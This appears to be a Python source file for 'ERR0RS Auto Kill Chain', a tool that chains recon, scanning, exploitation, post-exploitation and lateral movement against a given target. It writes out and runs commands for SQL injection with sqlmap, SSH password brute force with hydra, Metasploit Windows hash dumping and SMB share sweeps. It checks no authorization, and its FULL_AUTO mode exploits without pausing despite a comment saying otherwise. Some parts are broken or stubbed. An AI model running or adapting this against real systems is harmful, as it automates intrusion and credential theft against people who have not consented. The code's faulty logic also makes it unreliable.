#!/usr/bin/env python3
"""
ERR0RS ULTIMATE — Auto Kill Chain v1.0
Full automated pentest engagement: recon → scan → exploit → post → report

Competes with:
  Metasploit Pro  — automated exploitation + reporting
  Core Impact     — automated network pentest
  Pentera         — credential-based automation
  Cobalt Strike   — operator-guided automation

Execution modes:
  FULL_AUTO   — runs everything unattended (lab/CTF)
  SUPERVISED  — runs each phase, pauses for review
  DRY_RUN     — shows the plan without executing

Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone
"""

import asyncio, json, subprocess, shutil
from datetime import datetime
from pathlib import Path
from typing import Optional
from dataclasses import dataclass, field

import sys, os
sys.path.insert(0, str(Path(__file__).parents[2]))

try:
    from src.core.tool_executor import ToolExecutor
    from src.orchestration.campaign_manager import campaign_mgr
    _DEPS = True
except ImportError:
    _DEPS = False

OUTPUT_DIR = Path(__file__).parents[2] / "output"
OUTPUT_DIR.mkdir(exist_ok=True)


# ── Phase definitions ──────────────────────────────────────────────────────

KILL_CHAIN_PHASES = [
    {
        "id":    "recon",
        "name":  "Phase 1 — Reconnaissance",
        "mitre": "TA0043",
        "tools": ["nmap_discovery", "subfinder", "theHarvester"],
        "desc":  "Enumerate live hosts, open ports, and external attack surface",
        "auto_next": True,
    },
    {
        "id":    "scan",
        "name":  "Phase 2 — Scanning & Enumeration",
        "mitre": "TA0043",
        "tools": ["nmap_deep", "nuclei", "nikto", "gobuster", "enum4linux"],
        "desc":  "Deep service fingerprinting, version detection, web enumeration",
        "auto_next": True,
    },
    {
        "id":    "vuln_assessment",
        "name":  "Phase 3 — Vulnerability Assessment",
        "mitre": "TA0043",
        "tools": ["nuclei_cve", "nmap_vuln_scripts", "searchsploit"],
        "desc":  "Match discovered services to known CVEs and exploits",
        "auto_next": True,
    },
    {
        "id":    "exploitation",
        "name":  "Phase 4 — Exploitation",
        "mitre": "TA0001",
        "tools": ["metasploit_auto", "sqlmap", "hydra"],
        "desc":  "Attempt exploitation of confirmed vulnerabilities",
        "auto_next": False,   # Always pause before exploitation
    },
    {
        "id":    "post_exploit",
        "name":  "Phase 5 — Post-Exploitation",
        "mitre": "TA0006",
        "tools": ["msf_post_suggester", "msf_hashdump", "msf_enum"],
        "desc":  "Privilege escalation, credential harvesting, situational awareness",
        "auto_next": False,
    },
    {
        "id":    "lateral",
        "name":  "Phase 6 — Lateral Movement",
        "mitre": "TA0008",
        "tools": ["crackmapexec_sweep", "psexec_spray", "ssh_key_sweep"],
        "desc":  "Spread access through the network using harvested credentials",
        "auto_next": False,
    },
    {
        "id":    "reporting",
        "name":  "Phase 7 — Report Generation",
        "mitre": "N/A",
        "tools": ["pro_reporter"],
        "desc":  "Generate professional engagement report with all findings",
        "auto_next": True,
    },
]

# ── Tool command builders ─────────────────────────────────────────────────

def _build_cmd(tool_id: str, target: str, params: dict) -> Optional[str]:
    """Map tool_id → shell command string."""
    lhost = params.get("lhost", "")
    ports = params.get("ports", "top-1000")
    wordlist = params.get("wordlist", "/usr/share/wordlists/rockyou.txt")
    threads = params.get("threads", "20")

    commands = {
        # Recon
        "nmap_discovery":   f"nmap -sn --min-rate 1000 {target} -oN /tmp/errz_recon.txt",
        "subfinder":        f"subfinder -d {target} -silent -o /tmp/errz_subdomains.txt",
        "theHarvester":     f"theHarvester -d {target} -l 200 -b all 2>/dev/null | head -100",
        # Scan
        "nmap_deep":        f"nmap -sV -sC -O --top-ports 1000 {target} -oA /tmp/errz_deep 2>/dev/null",
        "nuclei":           f"nuclei -u http://{target} -s medium,high,critical -silent -o /tmp/errz_nuclei.txt 2>/dev/null",
        "nikto":            f"nikto -h http://{target} -o /tmp/errz_nikto.txt -Format txt 2>/dev/null",
        "gobuster":         f"gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t {threads} -q 2>/dev/null",
        "enum4linux":       f"enum4linux -a {target} 2>/dev/null | head -100",
        # Vuln assessment
        "nmap_vuln_scripts":f"nmap -sV --script vuln {target} -oN /tmp/errz_vulns.txt 2>/dev/null",
        "nuclei_cve":       f"nuclei -u http://{target} -tags cve -silent 2>/dev/null",
        "searchsploit":     f"searchsploit --nmap /tmp/errz_deep.xml 2>/dev/null | head -30",
        # Exploitation (requires session context)
        "sqlmap":           f"sqlmap -u 'http://{target}' --batch --dbs --level=1 --risk=1 -q 2>/dev/null",
        "hydra":            f"hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P {wordlist} {target} ssh -t 4 -q 2>/dev/null",
        # Post-exploit (run inside msfconsole via resource script)
        "msf_post_suggester": _msf_rc("post/multi/recon/local_exploit_suggester"),
        "msf_hashdump":       _msf_rc("post/windows/gather/smart_hashdump"),
        "msf_enum":           _msf_rc("post/windows/gather/enum_system"),
        # Lateral
        "crackmapexec_sweep":f"crackmapexec smb {target} --shares -u '' -p '' 2>/dev/null",
        # Reporting
        "pro_reporter":     "echo '[ERR0RS] Generating report...'",
    }
    return commands.get(tool_id)


def _msf_rc(module: str, target: str = "", session: int = 1) -> str:
    rc = f"/tmp/errz_{module.replace('/','_')}.rc"
    with open(rc, "w") as f:
        f.write(f"use {module}\nset SESSION {session}\nrun\nexit\n")
    return f"msfconsole -q -r {rc} 2>/dev/null"


# ── Result parser ─────────────────────────────────────────────────────────

def _parse_findings(tool_id: str, output: str) -> list:
    """Extract structured findings from tool output."""
    findings = []
    lines = output.splitlines()

    if tool_id == "nmap_deep":
        for line in lines:
            if "/tcp" in line and "open" in line:
                parts = line.split()
                port = parts[0] if parts else "?"
                service = parts[2] if len(parts) > 2 else "unknown"
                findings.append({
                    "title": f"Open port: {port} ({service})",
                    "severity": "info",
                    "detail": line.strip(),
                })

    elif tool_id in ("nuclei", "nuclei_cve"):
        for line in lines:
            if "[critical]" in line.lower():
                findings.append({"title": line.strip(), "severity": "critical", "detail": line})
            elif "[high]" in line.lower():
                findings.append({"title": line.strip(), "severity": "high", "detail": line})
            elif "[medium]" in line.lower():
                findings.append({"title": line.strip(), "severity": "medium", "detail": line})

    elif tool_id == "nmap_vuln_scripts":
        for i, line in enumerate(lines):
            if "VULNERABLE" in line.upper():
                context = lines[max(0,i-1):i+3]
                findings.append({"title": line.strip(), "severity": "high",
                                  "detail": "\n".join(context)})

    elif tool_id == "hydra":
        for line in lines:
            if "[" in line and "login:" in line.lower():
                findings.append({"title": f"Credential found: {line.strip()}",
                                  "severity": "critical", "detail": line.strip()})

    elif tool_id == "sqlmap":
        for line in lines:
            if "is vulnerable" in line.lower() or "injection" in line.lower():
                findings.append({"title": "SQL Injection confirmed",
                                  "severity": "critical", "detail": line.strip()})

    return findings


# ── Core AutoKillChain class ──────────────────────────────────────────────

@dataclass
class PhaseResult:
    phase_id:    str  = ""
    phase_name:  str  = ""
    status:      str  = "pending"
    tools_run:   int  = 0
    findings:    list = field(default_factory=list)
    raw_outputs: dict = field(default_factory=dict)
    duration_s:  float= 0.0
    started_at:  str  = ""
    ended_at:    str  = ""


class AutoKillChain:
    """
    Fully automated penetration testing kill chain.
    Runs each phase sequentially, collects findings,
    feeds results forward to the next phase.

    Mode "FULL_AUTO": runs without any prompts (lab/CTF use)
    Mode "SUPERVISED": pauses between phases for operator review
    Mode "DRY_RUN": prints the plan without executing anything
    """

    def __init__(self, mode: str = "SUPERVISED"):
        self.mode      = mode.upper()
        self.target    = ""
        self.params    = {}
        self.results:  list = []
        self.all_findings: list = []
        self.executor  = ToolExecutor() if _DEPS else None

    async def run(self, target: str, params: dict = None,
                  phases: list = None) -> dict:
        """
        Execute the full kill chain against a target.

        target: IP, CIDR, or domain
        params: dict with lhost, wordlist, threads, ports, etc.
        phases: list of phase IDs to run (default = all)
        """
        self.target = target
        self.params = params or {}
        selected = phases or [p["id"] for p in KILL_CHAIN_PHASES]

        print(f"\n{'='*60}")
        print(f"  ERR0RS AUTO KILL CHAIN — {self.mode} MODE")
        print(f"  Target: {target}")
        print(f"  Phases: {len(selected)}")
        print(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*60}\n")

        if self.mode == "DRY_RUN":
            return self._dry_run(selected)

        for phase_def in KILL_CHAIN_PHASES:
            if phase_def["id"] not in selected:
                continue

            result = await self._run_phase(phase_def)
            self.results.append(result)
            self.all_findings.extend(result.findings)

            # Auto-log to campaign
            if _DEPS:
                for f in result.findings:
                    campaign_mgr.add_finding(
                        title=f.get("title", "Unknown"),
                        severity=f.get("severity", "info"),
                        description=f.get("detail", ""),
                        target=target,
                        tool=f.get("tool", phase_def["id"]),
                    )

            # Pause for review unless FULL_AUTO or phase allows auto_next
            if self.mode == "SUPERVISED" and not phase_def.get("auto_next"):
                print(f"\n⏸  Phase complete. Found {len(result.findings)} findings.")
                cont = input("  Continue to next phase? [Y/n]: ").strip().lower()
                if cont in ("n", "no", "stop"):
                    print("\n⏹  Kill chain paused by operator.")
                    break

        return self._summarize()

    async def _run_phase(self, phase_def: dict) -> PhaseResult:
        result = PhaseResult(
            phase_id=phase_def["id"],
            phase_name=phase_def["name"],
            started_at=datetime.now().isoformat(),
        )
        print(f"\n{'─'*60}")
        print(f"  {phase_def['name']}")
        print(f"  {phase_def['desc']}")
        print(f"  MITRE: {phase_def['mitre']}")
        print(f"{'─'*60}")

        t0 = datetime.now()

        for tool_id in phase_def["tools"]:
            if not shutil.which(tool_id.split("_")[0]):
                # Tool not installed — skip silently
                result.raw_outputs[tool_id] = "NOT_INSTALLED"
                continue

            cmd = _build_cmd(tool_id, self.target, self.params)
            if not cmd:
                continue

            print(f"  ▶ Running: {tool_id}...", end="", flush=True)

            try:
                proc = subprocess.run(
                    cmd, shell=True, capture_output=True,
                    text=True, timeout=300
                )
                output = (proc.stdout + proc.stderr).strip()
                result.raw_outputs[tool_id] = output[:3000]
                found = _parse_findings(tool_id, output)
                for f in found:
                    f["tool"] = tool_id
                result.findings.extend(found)
                print(f" ✅ ({len(found)} findings)")
                result.tools_run += 1
            except subprocess.TimeoutExpired:
                print(f" ⏱  TIMEOUT")
                result.raw_outputs[tool_id] = "TIMEOUT"
            except Exception as e:
                print(f" ❌ ERROR: {e}")
                result.raw_outputs[tool_id] = f"ERROR: {e}"

        result.duration_s = (datetime.now() - t0).total_seconds()
        result.ended_at   = datetime.now().isoformat()
        result.status     = "complete"

        print(f"\n  Phase complete: {result.tools_run} tools ran, "
              f"{len(result.findings)} findings, {result.duration_s:.0f}s")
        return result

    def _dry_run(self, selected: list) -> dict:
        print("  DRY RUN — Commands that would execute:\n")
        for phase_def in KILL_CHAIN_PHASES:
            if phase_def["id"] not in selected:
                continue
            print(f"  [{phase_def['name']}]")
            for tool_id in phase_def["tools"]:
                cmd = _build_cmd(tool_id, self.target, self.params)
                print(f"    → {tool_id}: {cmd[:80] if cmd else 'N/A'}...")
            print()
        return {"status": "dry_run", "target": self.target,
                "phases": selected, "mode": self.mode}

    def _summarize(self) -> dict:
        by_severity = {}
        for f in self.all_findings:
            sev = f.get("severity", "info")
            by_severity[sev] = by_severity.get(sev, 0) + 1

        print(f"\n{'='*60}")
        print("  KILL CHAIN COMPLETE")
        print(f"  Target:   {self.target}")
        print(f"  Phases:   {len(self.results)} completed")
        print(f"  Findings: {len(self.all_findings)} total")
        for sev, count in sorted(by_severity.items()):
            icon = {"critical":"🔴","high":"🟠","medium":"🟡","low":"🟢","info":"ℹ️"}.get(sev,"•")
            print(f"    {icon} {sev.upper()}: {count}")
        print(f"{'='*60}\n")

        return {
            "status":      "complete",
            "target":      self.target,
            "mode":        self.mode,
            "phases_run":  len(self.results),
            "total_findings": len(self.all_findings),
            "by_severity": by_severity,
            "findings":    self.all_findings,
            "phase_results": [
                {"phase": r.phase_name, "tools_run": r.tools_run,
                 "findings": len(r.findings), "duration_s": r.duration_s}
                for r in self.results
            ],
        }


# ── Convenience function ──────────────────────────────────────────────────

async def auto_pentest(target: str, mode: str = "SUPERVISED",
                       params: dict = None, phases: list = None) -> dict:
    """One-call automated pentest."""
    chain = AutoKillChain(mode=mode)
    return await chain.run(target, params, phases)


def handle_killchain_command(params: dict) -> dict:
    """Entry point from ERR0RS route_command()"""
    target = params.get("target", "")
    if not target:
        return {"status": "error", "stdout": "Target required. Usage: auto pentest 192.168.1.1"}
    mode = params.get("mode", "SUPERVISED").upper()
    result = asyncio.run(auto_pentest(
        target=target, mode=mode,
        params=params, phases=params.get("phases"),
    ))
    return {"status": "success", "stdout": json.dumps(result, indent=2)}
